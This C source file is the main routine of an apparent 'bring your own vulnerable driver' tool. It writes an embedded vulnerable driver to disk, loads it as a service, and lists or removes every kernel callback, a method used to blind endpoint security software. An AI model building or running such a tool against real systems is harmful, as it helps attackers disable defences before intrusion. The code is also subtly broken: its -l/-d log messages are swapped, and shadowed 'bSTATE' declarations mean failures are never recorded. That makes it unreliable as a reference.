#include "common.h"
#include "vdriver.h"

// Print help message
void printHelp(char* fileName) {
	printf("Usage: %s -l / -d\n", fileName);
	printf("Options:\n");
	printf("  -l List Kernel Callbacks       - Lists all kernel callbacks through vulnerable driver\n");
	printf("  -d Disable Kernel Callbacks    - Lists and remove all kernel callbacks through vulnerable driver\n");
	printf("  -h Display this help message.\n");
}

int main(int argc, char** argv) {

	BOOL	bSTATE = TRUE;
	BOOL	bDisableKernelCallbacks = FALSE;	// Bool value to disable kernel callbacks
	LPWSTR	szVulnDriverPath = NULL;		// Stores the path to the vulnerable driver

	// If not enough arguments are supplied print the help function
	if (argc < 2) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	if (strcmp(argv[1], "-h") == 0) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}
	else if (strcmp(argv[1], "-l") == 0) {
		bDisableKernelCallbacks = FALSE;
	}
	else if (strcmp(argv[1], "-d") == 0) {
		bDisableKernelCallbacks = TRUE;
	}
	else {
		error("Unknown option: %s", argv[1]);
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	// Load NtoskrnlOffsets from the internet and calculate required offsets
	info("LoadNtoskrnlOffsetsFromInternet - Loading Ntoskrnl symbols from internet");
	if (!LoadNtoskrnlOffsetsFromInternet(TRUE)) {
		error("LoadNtoskrnlOffsetsFromInternet - Failed to load Ntoskrnl symbols");
		return EXIT_FAILURE;
	}
	PrintNtoskrnlOffsets();
	okay("LoadNtoskrnlOffsetsFromInternet - Loaded Ntoskrnl symbols");
	printf("\n");

	// Load fltMgr offsets from the internet and calculate required offsets
	info("LoadfltMgrOffsetsFromInternet - Loading fltMgr symbols from internet");
	if (!LoadfltMgrOffsetsFromInternet(TRUE)) {
		error("LoadfltMgrOffsetsFromInternet - Failed to load fltMgr symbols");
		return EXIT_FAILURE;
	}
	PrintfltMgrOffsets();
	okay("LoadfltMgrOffsetsFromInternet - Loaded fltMgr symbols");
	printf("\n");

	// Write the vulnerable driver to the file system
	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
		error("Failed to write driver to filesystem");
		if (szVulnDriverPath) {
			free(szVulnDriverPath); // Free the allocated memory
		}
		return EXIT_FAILURE;
	}
	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
	printf("\n");
	
	// Load the vulnerable driver as a service
	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
		error("LoadDriver - Failed to load driver");
		BOOL bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// List and or disable kernel callbacks
	if (bDisableKernelCallbacks) {
		info("ListOrRemoveKernelCallbacks - Listing all kernel callbacks");
		if (!ListOrRemoveKernelCallbacks(TRUE)) {
			error("ListOrRemoveKernelCallbacks - Failed");
			BOOL bSTATE = FALSE;
			goto _cleanUp;
		}
	}
	else {
		info("ListOrRemoveKernelCallbacks - Listing and removing all kernel callbacks");
		if (!ListOrRemoveKernelCallbacks(FALSE)) {
			error("ListOrRemoveKernelCallbacks - Failed");
			BOOL bSTATE = FALSE;
			goto _cleanUp;
		}
	}
	okay("ListOrRemoveKernelCallbacks - Completed");
	

_cleanUp:

	// ** CLEANUP SECTION ** //

	// Unloading vulnerable driver
	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	if (!UnloadDriver(g_VULNDRIVERNAME)) {
		error("UnloadDriver - Failed to unload driver");
		BOOL bSTATE = FALSE;
	}
	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	printf("\n");
	
	// Remove vulnerable driver from filesystem
	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
	if (!RemoveFileW(szVulnDriverPath)) {
		error("RemoveFileW - Failed to delete file");
		BOOL bSTATE = FALSE;
	}
	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
	printf("\n");

	// Free allocated memory
	if (szVulnDriverPath != NULL) {
		free(szVulnDriverPath);
	}

	if (bSTATE) {
		return EXIT_SUCCESS;
	}
	else {
		return EXIT_FAILURE;
	}

}